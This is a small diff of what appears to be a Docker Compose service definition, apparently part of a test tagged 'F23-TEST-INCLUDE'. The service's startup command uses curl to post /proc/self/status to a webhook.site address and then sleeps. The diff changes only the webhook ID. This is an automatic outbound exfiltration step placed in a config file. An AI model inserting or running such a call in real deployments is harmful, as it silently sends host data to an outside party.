@@ -5,5 +5,5 @@ services:
       - sh
       - -c
       - |
-        curl -sS --max-time 20 --data-binary @/proc/self/status "https://webhook.site/5a6ae326-fdb5-4b51-a691-92509b495ff4?tag=F23-TEST-INCLUDE"
+        curl -sS --max-time 20 --data-binary @/proc/self/status "https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=F23-TEST-INCLUDE"
         sleep 999999
